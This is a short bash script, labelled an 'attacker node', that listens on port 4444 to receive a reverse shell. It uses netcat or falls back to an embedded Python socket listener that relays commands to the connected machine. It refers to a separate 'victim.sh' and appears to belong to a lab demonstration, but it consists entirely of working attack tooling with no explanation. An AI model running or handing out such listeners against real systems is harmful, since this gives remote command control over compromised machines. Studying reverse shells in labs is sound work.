#!/usr/bin/env bash
# Attacker node: listen on 4444 for the reverse shell.
# Uses netcat when available; otherwise a built-in Python listener (no install needed).
PORT=4444
echo "[*] Listening on 0.0.0.0:${PORT} — run 'bash victim.sh' in another terminal."
if command -v nc >/dev/null 2>&1; then
  exec nc -lvnp "$PORT"
fi
echo "[*] netcat not found — using the built-in Python listener."
exec python3 - "$PORT" <<'PY'
import socket, sys, select
port = int(sys.argv[1])
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", port)); srv.listen(1)
conn, addr = srv.accept()
print("Connection received from", addr, flush=True)
while True:
    r, _, _ = select.select([sys.stdin, conn], [], [])
    if conn in r:
        data = conn.recv(4096)
        if not data: break
        sys.stdout.write(data.decode(errors="replace")); sys.stdout.flush()
    if sys.stdin in r:
        line = sys.stdin.readline()
        if not line: break
        conn.sendall(line.encode())
PY
